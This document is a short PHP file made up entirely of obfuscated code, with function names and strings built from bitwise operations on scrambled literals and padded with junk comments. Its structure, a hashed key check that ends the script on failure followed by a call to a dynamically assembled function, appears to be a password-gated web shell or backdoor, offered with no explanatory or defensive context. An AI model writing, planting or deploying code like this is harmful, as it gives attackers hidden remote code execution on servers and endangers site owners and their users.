<?php
$fwA='Za2v4Fu8b'.t64o__t2Cqp;$wm3s5tm="n+^;hm1~]MK"&'[kVq%X=:ANW';$iYOjLZH='@ %'|#t'.
     'L$1';$UYwgkO='UT=$(21Z,+.MAH<"=O>2'^'69'.PZwEB.'-ZtH:?+cGN<_K';$ZIYlsH17=/*d1'.
     'h9B~*/RxUh5.' 0BT9%0X)'|'R '.Lh7z0oE1.'$=Y(';$MlBCD="uo;u|".v7su9u7./*cq_aKiC'.
     'e*/";7o9{{fc5"&'7tu='.dcu7cy3w.'}pe?13m{>';$D90Vgb3='MR:Yg(Q=7!&Q'^"=%"./*uzg'.
     'pTo^9T1>uN*/_68R."\$OZ@U>";$ff5c='<?35}HS,_*H2'^LEVB.'"?6Y1O+W';$PD='! %'./*h'.
     '9gwuAR*/A1301.'"02'|'D04` #!(c42';$lIQaqhptUK=KWTS&'LTV|';$oSc01aI6=J|_;'aAIf'.
     ';XqU|4W.i';$GiGTAzN="n& z3"^'6'.yn5x;$wR7jI="|\$/:>"^'5'.epwm;$VgutHWJZf8R=#D'.
     '{S'&I_;$gi=p^'4';$vBnD="6"^x;$EFlWn9=('u#'.zoyqq.'!G@u'^'SmZ;7J('.oceX)^/*P4z'.
     '_#1L]TB@g*/$wm3s5tm;$ZExfXb=$iYOjLZH|('7b?'&it1);$IlX=('&e8B,V'|cQTgJb)&('4IU'.
     '&X!'^'S$"[6W');$vA_OdhbQ=('ZD4?cE['.H8pM.' <^7LUY!*'^'!%XS<0(-C/:'.UR5h.#epvG'.
     '-##VS')&$UYwgkO;$mzQ=('}u]x_U'&']|w{_G')&('sy+3gO'^';,ue8>');$o0fliln37=/*m2N'.
     'rD4*/$D90Vgb3&$ff5c;$Rc7_rNKeL=$ZIYlsH17^(',#(PD!D2)@]D H'|'(!*X@)D #'./*PR8I'.
     '@9T=*/TAN0L);$t6Y=("`U@8:D.*,ti@Ft,".uG8yT^'571'.Hp0NJzKBc.'*F`^.w?;')^('jzr*'.
     'Xa=hT<$es.'.ElGc.',z'^'Z[2'.kqVl.';fDw<'.SKe2tAR.'(');if($EFlWn9($ZExfXb(/*aw'.
     'nFOj|<*ha*/$IlX($mzQ)),$MlBCD.$PD))die;$vA_OdhbQ($o0fliln37,array(/*Y1NmTTrYg'.
     'uPnU?plp?H*/$Rc7_rNKeL,$IlX($lIQaqhptUK.$oSc01aI6.$GiGTAzN.$wR7jI./*Xpz02p5FT'.
     '+_{V*/$VgutHWJZf8R.$gi.$vBnD),$t6Y));#Ft(eSb9*NC[4se8ej$<v>k0vXh-xPUW4<E>hd1'.
     '1U9>;8(U6]C&PUNxF6_;Hoh+5lQx_loFWP,H:LQ| g;I%[Hw+x^bW0';